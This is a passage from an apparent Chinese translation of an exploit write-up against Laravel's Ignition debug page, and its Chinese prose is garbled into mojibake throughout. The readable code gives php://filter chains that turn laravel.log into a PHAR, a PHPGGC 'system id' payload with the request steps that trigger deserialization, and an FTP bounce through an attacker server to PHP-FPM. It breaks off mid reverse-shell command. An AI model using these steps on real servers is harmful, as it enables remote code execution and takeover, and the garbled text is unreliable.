[T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... } ËøôÊÆµ‰ª£Á†ÅÊØîÊàë‰ª¨È¢ÑÊÉ≥ÁöÑË¶ÅÂ§çÊùÇ‰∏Ä‰∫õÔºöÂÆÉ‰ºöÂú®ËØªÂèñÁªôÂÆöÁöÑÊñá‰ª∂Ë∑ØÂæÑ[1]ÂêéÔºåÂ∞Ü$variableNameÊõøÊç¢‰∏∫$variableName ?? ''ÔºåÂàùÂßãÊñá‰ª∂ÂíåÊñ∞Êñá‰ª∂ÈÉΩÂ∞ÜË¢´Ê†áËÆ∞Âåñ[2]„ÄÇÂ¶ÇÊûúÊàë‰ª¨ÁöÑ‰ª£Á†ÅÁªìÊûÑÊ≤°ÊúâÂèëÁîüË∂ÖÂá∫È¢ÑÊúüÁöÑÂèòÂåñÔºåÊñá‰ª∂Â∞ÜË¢´ÊõøÊç¢‰∏∫Êñ∞ÁöÑÂÜÖÂÆπ„ÄÇÂê¶ÂàôÔºåmakeOptionalÂ∞ÜËøîÂõûfalse[3]ÔºåÊñ∞Êñá‰ª∂Â∞Ü‰∏ç‰ºöË¢´ÂÜôÂÖ•„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨Êó†Ê≥ï‰ΩøÁî®variableNameÂÅöÂ§™Â§ö‰∫ãÊÉÖ„ÄÇ Ââ©‰∏ãÁöÑÂîØ‰∏ÄËæìÂÖ•ÂèòÈáèÂ∞±ÊòØviewFile„ÄÇÂ¶ÇÊûúÊàë‰ª¨ÂØπvariableNameÂíåÂÆÉÁöÑÊâÄÊúâÁî®Ê≥ïËøõË°åÊäΩË±°ÔºåÊàë‰ª¨ÊúÄÁªà‰ºöÂæóÂà∞‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÁâáÊÆµÔºö $contents =file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents); Âà∞ÁõÆÂâç‰∏∫Ê≠¢ÔºåÂ§ßÂÆ∂ÂèØËÉΩÈÉΩÂê¨ËØ¥ËøáOrange TsaiÊºîÁ§∫ÁöÑ‰∏ä‰º†ËøõÂ∫¶ÊäÄÊúØ„ÄÇËØ•ÊäÄÊúØÂà©Áî®php://filterÂú®ËøîÂõûÊñá‰ª∂‰πãÂâç‰øÆÊîπÂÖ∂ÂÜÖÂÆπ„ÄÇÂÄüÂä©‰∫éËØ•ÊäÄÊúØÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÊºèÊ¥ûÂà©Áî®ÂéüËØ≠Êù•ËΩ¨Êç¢Êñá‰ª∂ÁöÑÂÜÖÂÆπ $ echo test | base64 | base64 > /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt'; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents); $ cat /path/to/file.txt test Êàë‰ª¨Â∑≤ÁªèÊîπÂèò‰∫ÜÊñá‰ª∂ÁöÑÂÜÖÂÆπÔºÅÈÅóÊÜæÁöÑÊòØÔºåËøôÂ∞Ü‰ºöÂ∫îÁî®‰∏§Ê¨°ËΩ¨Êç¢„ÄÇÈòÖËØªÊñáÊ°£ÂêéÔºåÊàë‰ª¨ÊâæÂà∞‰∫ÜÂè™ËøõË°å‰∏ÄÊ¨°ËΩ¨Êç¢ÁöÑÊñπÊ≥ïÔºö # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt'; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt'; ÂùèÂ≠óÁ¨¶ÁîöËá≥ÈÉΩ‰ºöË¢´ÂøΩÁï•Ôºö $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt'; $contents = file_get_contents($f); file_put_contents($f, $contents); $ cat /path/to/file.txt test ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåLaravelÁöÑÊó•ÂøóÊñá‰ª∂ÔºàÂ≠òÊîæPHPÈîôËØØÂíåÂ†ÜÊ†àË∑üË∏™ÔºâÊòØÂ≠òÂÇ®Âú®storage/log/laravel.log‰∏≠ÁöÑ„ÄÇ‰∏ãÈù¢ÔºåËÆ©Êàë‰ª¨ÈÄöËøáÂ∞ùËØïÂä†ËΩΩ‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑÊñá‰ª∂Êù•ÁîüÊàê‰∏Ä‰∏™ÈîôËØØ, Âç≥SOME_TEXT_OF_OUR_CHOICEÔºö [2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\"exception\":\"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions->handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController->__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline->Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline->then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel->sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel->handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \"} Êàë‰ª¨ÂèØ‰ª•ÂêëÊñá‰ª∂‰∏≠Ê≥®ÂÖ•ÔºàÂá†‰πéÔºâ‰ªªÊÑèÁöÑÂÜÖÂÆπ‰∫Ü„ÄÇÁêÜËÆ∫‰∏äËÆ≤ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®OrangeÂèëÊòéÁöÑÊäÄÊúØÂ∞ÜÊó•ÂøóÊñá‰ª∂ËΩ¨Êç¢‰∏∫ÊúâÊïàÁöÑPHARÊñá‰ª∂ÔºåÁÑ∂ÂêéÔºå‰ΩøÁî®phar://ÂåÖË£ÖÂô®Êù•ËøêË°åÂ∫èÂàóÂåñÁöÑ‰ª£Á†Å„ÄÇÈÅóÊÜæÁöÑÊòØÔºåËøôÂÆûÈôÖ‰∏äÊòØË°å‰∏çÈÄöÁöÑÔºåÂπ∂‰∏îÂéüÂõ†ÊúâÂæàÂ§ö„ÄÇ Êàë‰ª¨Âú®ÂâçÈù¢ËØ¥ËøáÔºåÂΩìÂØπ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ËøõË°åba se64-decodingÂ§ÑÁêÜÊó∂ÔºåPHP‰ºöÂøΩÁï•‰ªª‰ΩïÂùèÂ≠óÁ¨¶„ÄÇËøôÈÄöÂ∏∏ÊòØÊ≠£Á°ÆÁöÑÔºå‰ΩÜÊòØÊúâ‰∏Ä‰∏™Â≠óÁ¨¶Èô§Â§ñÔºåÂç≥=„ÄÇÂ¶ÇÊûú‰Ω†‰ΩøÁî®ba se64-decodeËøáÊª§‰∏Ä‰∏™‰∏≠Èó¥Âê´ÊúâÂ≠óÁ¨¶=ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåPHPÂ∞Ü‰∫ßÁîü‰∏Ä‰∏™ÈîôËØØÔºåÂπ∂‰∏î‰∏ç‰ºöËøîÂõû‰ªª‰ΩïÂÜÖÂÆπ„ÄÇ Â¶ÇÊûúÊàë‰ª¨ËÉΩÊéßÂà∂Êï¥‰∏™Êñá‰ª∂ÔºåÈÇ£Â∞±Â•Ω‰∫Ü„ÄÇÁÑ∂ËÄåÔºåÊàë‰ª¨Ê≥®ÂÖ•Âà∞Êó•ÂøóÊñá‰ª∂‰∏≠ÁöÑÊñáÊú¨Âè™ÊòØÂÖ∂‰∏≠ÂæàÂ∞èÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇÂÆÉ‰∏ç‰ªÖÊúâ‰∏Ä‰∏™‰∏çÁÆóÂæàÂ§ßÁöÑÂâçÁºÄÔºàÊó•ÊúüÔºâÔºåËøòÊúâ‰∏Ä‰∏™ËáÉËÇøÁöÑÂêéÁºÄÔºàÂ†ÜÊ†àË∑üË∏™Ôºâ„ÄÇÊ≠§Â§ñÔºåÊàë‰ª¨Ê≥®ÂÖ•ÁöÑÊñáÊú¨ËøòÂá∫Áé∞‰∫Ü‰∏§Ê¨°ÔºÅ ‰∏ãÈù¢ÊòØÂè¶‰∏Ä‰ª∂ÂèØÊÄïÁöÑ‰∫ãÊÉÖÔºö php > var_dump(base64_decode(base64_decode('[2022-04-3023:59:11]'))); string(0) \"\" php >var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]'))); string(1) \"2\" Ê†πÊçÆÊó•ÊúüÁöÑ‰∏çÂêåÔºåÂØπÂâçÁºÄËøõË°å‰∏§Ê¨°Ëß£Á†ÅÊó∂Ôºå‰ºöÂæóÂà∞‰∏çÂêåÂ§ßÂ∞èÁöÑÁªìÊûú„ÄÇÂΩìÊàë‰ª¨ÂØπÂÆÉËøõË°åÁ¨¨‰∏âÊ¨°Ëß£Á†ÅÊó∂ÔºåÂú®Á¨¨‰∫åÁßçÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨ÁöÑpayloadÂ∞Ü‰ª•2‰Ωú‰∏∫ÂâçÁºÄÔºå‰ªéËÄåÈúÄË¶ÅÊîπÂèòbase64Ê∂àÊÅØÁöÑÂØπÈΩêÊñπÂºè„ÄÇ ‰∏∫‰∫Ü‰ΩøÂÖ∂Ê≠£Â∏∏ËøêË°åÔºåÊàë‰ª¨ÂøÖÈ°ª‰∏∫ÊØè‰∏™ÁõÆÊ†áÂª∫Á´ã‰∏Ä‰∏™Êñ∞ÁöÑpayloadÔºåÂõ†‰∏∫Â†ÜÊ†àË∑üË∏™‰∏≠ÂåÖÂê´ÁªùÂØπÊñá‰ª∂ÂêçÔºõÂπ∂‰∏îÔºåÊØèÁßíÈÉΩÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Êñ∞ÁöÑpayloadÔºåÂõ†‰∏∫ÂâçÁºÄ‰∏≠ÂåÖÂê´Êó∂Èó¥„ÄÇÂπ∂‰∏îÔºåÂè™Ë¶ÅÊúâ‰∏Ä‰∏™Â≠óÁ¨¶=ÈúÄË¶ÅËøõË°åbase64-decodeÂ§ÑÁêÜÔºå‰ªçÁÑ∂‰ºöÈù¢‰∏¥Â§±Ë¥•„ÄÇ Âõ†Ê≠§ÔºåÊàë‰ª¨ÂõûÂà∞PHPÊñáÊ°£‰∏≠ÂØªÊâæÂÖ∂‰ªñÁ±ªÂûãÁöÑËøáÊª§Âô®„ÄÇ [previous log entries] [prefix]PAYLOAD[midfix]PAYLOAD[suffix] ÈÅóÊÜæÁöÑÊòØÔºåÊàë‰ª¨Â∑≤Áªè‰∫ÜËß£Âà∞ÔºåÂ¶ÇÊûúÊª•Áî®base64-decodeÁöÑËØùÔºåÂèØËÉΩ‰ºöÂú®Êüê‰∏™Êó∂ÂÄôÂ§±Ë¥•„ÄÇÁé∞Âú®ÔºåËÆ©Êàë‰ª¨Êù•Âà©Áî®Ëøô‰∏ÄÁÇπÔºöÂ¶ÇÊûúÊàë‰ª¨Êª•Áî®ÂÆÉÔºåÂ∞ÜÂèëÁîüËß£Á†ÅÈîôËØØÔºåÊó•ÂøóÊñá‰ª∂Â∞ÜË¢´Ê∏ÖÈô§ÔºÅËøôÊ†∑ÔºåÊàë‰ª¨Ëß¶ÂèëÁöÑ‰∏ã‰∏Ä‰∏™ÈîôËØØÂ∞ÜÂçïÁã¨Â≠òÂú®‰∫éÊó•ÂøóÊñá‰ª∂‰∏≠Ôºö [prefix]PAYLOAD[midfix]PAYLOAD[suffix] Áé∞Âú®ÔºåÊàë‰ª¨ÂèàÂõûÂà∞‰∫ÜÊúÄÂàùÁöÑÈóÆÈ¢ò‰∏äÔºö‰øùÁïô‰∏Ä‰∏™payloadÂπ∂Âà†Èô§ÂÖ∂‰ΩôÁöÑ„ÄÇÂπ∏ËøêÁöÑÊòØÔºåphp://filterÂπ∂‰∏çÈôê‰∫ébase64Êìç‰Ωú„ÄÇ‰æãÂ¶ÇÔºåÊàë‰ª¨ÂèØ‰ª•Áî®ÂÆÉÊù•ËΩ¨Êç¢Â≠óÁ¨¶ÈõÜÔºå‰∏ãÈù¢ÊòØ‰ªéUTF-16Âà∞UTF-8ÁöÑËΩ¨Êç¢Ôºö echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); ÂçõÊµØ‚Å•Áâ∞Êô•Á°©Â¥†PAYLOADÊµõÊë©Ê•¶Âµ∏PAYLOADÂçõÊµØ‚Å•Áï≥Êô¶Á°©Â¥† Êàë‰ª¨ÁöÑpayloadËøòÂú®ÈÇ£ÈáåÔºåÂÆâÂÖ®Êó†ÊÅôÔºåÂè™ÊòØÂâçÁºÄÂíåÂêéÁºÄÂèòÊàê‰∫ÜÈùûASCIIÂ≠óÁ¨¶„ÄÇÁÑ∂ËÄåÔºåÂú®Êó•ÂøóÊù°ÁõÆ‰∏≠ÔºåÊàë‰ª¨ÁöÑpayloadÂá∫Áé∞‰∫Ü‰∏§Ê¨°ÔºåËÄå‰∏çÊòØ‰∏ÄÊ¨°„ÄÇÊàë‰ª¨ÈúÄË¶ÅÂéªÊéâÁ¨¨‰∫å‰∏™„ÄÇ Áî±‰∫éÊØè‰∏™UTF-16Â≠óÁ¨¶Âç†Áî®‰∏§‰∏™Â≠óËäÇÔºåÊâÄ‰ª•ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂú®PAYLOADÁöÑÁ¨¨‰∫å‰∏™ÂÆû‰æãÁöÑÊú´Â∞æÂ¢ûÂä†‰∏Ä‰∏™Â≠óËäÇÔºåÊù•‰ΩøÂÖ∂Êó†Ê≥ïÂØπÈΩêÔºö echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); ÂçõÊµØ‚Å•Áâ∞Êô•Á°©Â¥†PAYLOADÂ≠òÊ•≠Êô§Á°©ÂÅù‰ÑÄÂ§Ä‰∞Ä‰ºÄ‰ÑÄ‰êÄÂ†ÄÂçõÊµØ‚Å•Áï≥Êô¶Á°©Â¥† ËøôÊ†∑ÂÅöÁöÑÂ•ΩÂ§ÑÊòØÔºåÂâçÁºÄÁöÑÂØπÈΩêÊñπÂºè‰∏çÂÜçÈáçË¶ÅÔºöÂ¶ÇÊûúÂâçÁºÄÂ§ßÂ∞èÁõ∏Á≠âÔºåÁ¨¨‰∏Ä‰∏™payloadÂ∞ÜË¢´Ê≠£Á°ÆËß£Á†ÅÔºõÂê¶ÂàôÁöÑËØùÔºåÁ¨¨‰∫å‰∏™payloadÂ∞±‰ºöË¢´Ê≠£Á°ÆËß£Á†Å„ÄÇ Â¶ÇÊûúÂ∞Ü‰∏äÈù¢ÁöÑÂèëÁé∞‰∏éÂâçÈù¢ÁöÑbase64-decodingÁªìÂêàËµ∑Êù•ÔºåÂ∞±ËÉΩÂ§üÂØπÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑ‰ªª‰Ωï‰∏úË•øËøõË°åÁºñÁ†ÅÔºö $ echo -n TEST! | base64 | sed -E 's/./\\0\\\\0/g' V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0 $ echo -ne '[Some prefix ]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[midfix]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt'); TEST! ËØ¥Âà∞ÂØπÈΩêÔºåÂ¶ÇÊûúÊó•ÂøóÊñá‰ª∂Êú¨Ë∫´‰∏çÊòØ2Â≠óËäÇÂØπÈΩêÁöÑÔºåËΩ¨Êç¢ËøáÊª§Âô®Â∞ÜÂ¶Ç‰ΩïÂ§ÑÁêÜÔºü PHP Warning: file_get_contents(): iconv stream filter(\"utf16le\"=>\"utf-8\"): invalid multibyte sequence in phpshell code on line 1 ËøôÂèàÊòØ‰∏Ä‰∏™ÈóÆÈ¢ò„ÄÇ‰∏çËøáÔºåÊàë‰ª¨ÂèØ‰ª•ÂÄüÂä©‰∏§‰∏™payloadÊù•ËΩªÊùæÂú∞Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºö‰∏Ä‰∏™ÊòØÊó†ÂÆ≥ÁöÑpayload AÔºåÂè¶‰∏Ä‰∏™ÊòØÂÖ∑ÊúâÊîªÂáªÊÄßÁöÑpayload BÔºåÂÖ∑‰ΩìÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö [prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix] [prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix] Áî±‰∫éËøôÈáåÂâçÁºÄ„ÄÅ‰∏≠ÁºÄÂíåÂêéÁºÄÈÉΩÂ≠òÂú®‰∏§‰ªΩÔºåËøòÊèê‰æõ‰∫Üpayload_aÂíåpayload_bÔºåÊâÄ‰ª•ÔºåÊó•ÂøóÊñá‰ª∂ÁöÑÂ§ßÂ∞èÂøÖÁÑ∂ÊòØÂÅ∂Êï∞Ôºå‰ªéËÄåÈÅøÂÖç‰∫ÜÈîôËØØÁöÑÂèëÁîü„ÄÇ ÊúÄÂêéÔºåÊàë‰ª¨ËøòË¶ÅËß£ÂÜ≥ÊúÄÂêé‰∏Ä‰∏™ÈóÆÈ¢òÔºöÊàë‰ª¨‰ΩøÁî®NULLÂ≠óËäÇÂ∞ÜpayloadÁöÑÂ≠óËäÇ‰ªé‰∏Ä‰∏™Â°´ÂÖÖ‰∏∫‰∏§‰∏™„ÄÇÂú®PHP‰∏≠ËØïÂõæÂä†ËΩΩ‰∏Ä‰∏™Â∏¶ÊúâNULLÂ≠óËäÇÁöÑÊñá‰ª∂Êó∂Ôºå‰ºöÁîüÊàê‰ª•‰∏ãÈîôËØØÔºö PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1 Âõ†Ê≠§ÔºåÊàë‰ª¨Â∞ÜÊó†Ê≥ïÂú®ÈîôËØØÊó•Âøó‰∏≠Ê≥®ÂÖ•Â∏¶ÊúâNULLÂ≠óËäÇÁöÑpayload„ÄÇÂπ∏ËøêÁöÑÊòØÔºåÊúÄÂêé‰∏Ä‰∏™ËøáÊª§Âô®ÂèØ‰ª•Â∏ÆÂà∞Êàë‰ª¨ÔºåÂÆÉÂ∞±ÊòØconvert.quoted-printable-decode„ÄÇ Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®=00ÂØπNULLÂ≠óËäÇËøõË°åÁºñÁ†Å„ÄÇ ‰∏ãÈù¢ÊòØÊàë‰ª¨ÊúÄÁªàÁöÑËΩ¨Êç¢ÈìæÔºö viewFile:php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.ba se64-decode/resource=/path/to/storage/logs/laravel.log ÂàõÂª∫‰∏Ä‰∏™PHPGGC payloadÔºåÂπ∂ÂØπÂÖ∂ËøõË°åÁºñÁ†ÅÔºö php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g' U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 Ê∏ÖÁ©∫Êó•Âøó viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log ÂàõÂª∫Á¨¨‰∏Ä‰∏™Êó•ÂøóÊù°ÁõÆÔºåÁî®‰∫éÂØπÈΩêÔºö viewFile: AA ÂàõÂª∫Â∏¶ÊúâpayloadÊó•ÂøóÊù°ÁõÆÔºö viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 ÈÄöËøáÊàë‰ª¨ÁöÑËøáÊª§Âô®Â∞ÜÊó•ÂøóÊñá‰ª∂ËΩ¨Êç¢‰∏∫ÊúâÊïàÁöÑPHARÔºö viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log ÂêØÂä®PHARÁöÑÂèçÂ∫èÂàóÂåñËøáÁ®ãÔºö viewFile: phar:///path/to/storage/logs/laravel.log Âà©Áî®FTP‰∏éPHP-FPMËøõË°å‰∫§‰∫í Áî±‰∫éÊàë‰ª¨ÂèØ‰ª•ËøêË°åfile_get_contentsÊù•Êü•Êâæ‰ªª‰Ωï‰∏úË•øÔºåÂõ†Ê≠§ÔºåÂèØ‰ª•ÈÄöËøáÂèëÈÄÅHTTPËØ∑Ê±ÇÊù•Êâ´ÊèèÂ∏∏Áî®Á´ØÂè£„ÄÇÁªìÊûúÂèëÁé∞ÔºåPHP-FPM‰ºº‰πéÊ≠£Âú®‰æ¶Âê¨Á´ØÂè£9000„ÄÇ ‰ºóÊâÄÂë®Áü•ÔºåÂ¶ÇÊûúÊàë‰ª¨ËÉΩÂêëPHP-FPMÊúçÂä°ÂèëÈÄÅ‰∏Ä‰∏™‰ªªÊÑèÁöÑ‰∫åËøõÂà∂Êï∞ÊçÆÂåÖÔºåÂ∞±ÂèØ‰ª•Âú®Êú∫Âô®‰∏äÊâßË°å‰ª£Á†Å„ÄÇËøôÁßçÊäÄÊúØÁªèÂ∏∏‰∏égopher://ÂçèËÆÆÁªìÂêà‰ΩøÁî®ÔºåcurlÊîØÊåÅgopher://ÂçèËÆÆÔºå‰ΩÜPHPÂç¥‰∏çÊîØÊåÅ„ÄÇ Âè¶‰∏Ä‰∏™Â∑≤Áü•ÁöÑÂÖÅËÆ∏ÈÄöËøáTCPÂèëÈÄÅ‰∫åËøõÂà∂Êï∞ÊçÆÂåÖÁöÑÂçèËÆÆÊòØFTPÔºåÊõ¥ÂáÜÁ°ÆÁöÑËØ¥ÊòØËØ•ÂçèËÆÆÁöÑË¢´Âä®Ê®°ÂºèÔºöÂ¶ÇÊûú‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØËØïÂõæ‰ªéFTPÊúçÂä°Âô®‰∏äËØªÂèñ‰∏Ä‰∏™Êñá‰ª∂ÔºàÊàñÂÜôÂÖ•ÔºâÔºåÊúçÂä°Âô®‰ºöÈÄöÁü•ÂÆ¢Êà∑Á´ØÂ∞ÜÊñá‰ª∂ÁöÑÂÜÖÂÆπËØªÂèñÔºàÊàñÂÜôÔºâÂà∞‰∏Ä‰∏™ÁâπÂÆöÁöÑIPÂíåÁ´ØÂè£‰∏ä„ÄÇËÄå‰∏îÔºåËøôÈáåÂØπËøô‰∫õIPÂíåÁ´ØÂè£Ê≤°ÊúâËøõË°åÂøÖË¶ÅÁöÑÈôêÂà∂„ÄÇ‰æãÂ¶ÇÔºåÊúçÂä°Âô®ÂèØ‰ª•ÂëäËØâÂÆ¢Êà∑Á´ØËøûÊé•Âà∞Ëá™Â∑±ÁöÑ‰∏Ä‰∏™Á´ØÂè£ÔºåÂ¶ÇÊûúÂÆÉÊÑøÊÑèÁöÑËØù„ÄÇ Áé∞Âú®ÔºåÂ¶ÇÊûúÊàë‰ª¨Â∞ùËØï‰ΩøÁî®viewFile=ftp://evil-server.lexfo.fr/file.txtÊù•Âà©Áî®Ëøô‰∏™ÊºèÊ¥ûÔºå‰ºöÂèëÁîü‰ª•‰∏ãÊÉÖÂÜµÔºö file_get_contents()ËøûÊé•Âà∞Êàë‰ª¨ÁöÑFTPÊúçÂä°Âô®ÔºåÂπ∂‰∏ãËΩΩfile.txt„ÄÇ file_put_contents()ËøûÊé•Âà∞Êàë‰ª¨ÁöÑFTPÊúçÂä°Âô®ÔºåÂπ∂Â∞ÜÂÖ∂‰∏ä‰º†Âõûfile.txt„ÄÇ ÊÇ®ÂèØËÉΩÂ∑≤ÁªèÁü•ÈÅìËøôÊòØÊÄé‰πàÂõû‰∫ãÔºöÊàë‰ª¨Â∞Ü‰ΩøÁî®FTPÂçèËÆÆÁöÑË¢´Âä®Ê®°ÂºèËÆ©file_get_contents()Âú®Êàë‰ª¨ÁöÑÊúçÂä°Âô®‰∏ä‰∏ãËΩΩ‰∏Ä‰∏™Êñá‰ª∂ÔºåÂΩìÂÆÉËØïÂõæ‰ΩøÁî®file_put_contents()ÊääÂÆÉ‰∏ä‰º†ÂõûÂéªÊó∂ÔºåÊàë‰ª¨Â∞ÜÂëäËØâÂÆÉÊääÊñá‰ª∂ÂèëÈÄÅÂà∞127.0.0.1:9000„ÄÇ ËøôÊ†∑ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÂêëPHP-FPMÂèëÈÄÅ‰∏Ä‰∏™‰ªªÊÑèÁöÑÊï∞ÊçÆÂåÖÔºå‰ªéËÄåÊâßË°å‰ª£Á†Å„ÄÇ Âà©Áî®ËøôÁßçÊñπÊ≥ïÔºåÂú®Êàë‰ª¨ÁöÑÁõÆÊ†á‰∏äÊàêÂäüÂú∞Âà©Áî®‰∫ÜËØ•ÊºèÊ¥û„ÄÇ ‰∏ãÈù¢Êàë‰ª¨Êù•ÊºîÁ§∫‰∏Ä‰∏ãÊîªÂáªËøáÁ®ã„ÄÇ È¶ñÂÖàÔºåÊàë‰ª¨‰ΩøÁî®gopherusÁîüÊàêÊîªÂáªfastcgiÁöÑpayloadÔºö python gopherus.py --exploit fastcgi /var/www/public/index.php # ËøôÈáåËæìÂÖ•ÁöÑÊòØÁõÆÊ†á‰∏ªÊú∫‰∏ä‰∏Ä‰∏™Â∑≤Áü•Â≠òÂú®ÁöÑphpÊñá‰ª∂ bash -c \"bash -i >& 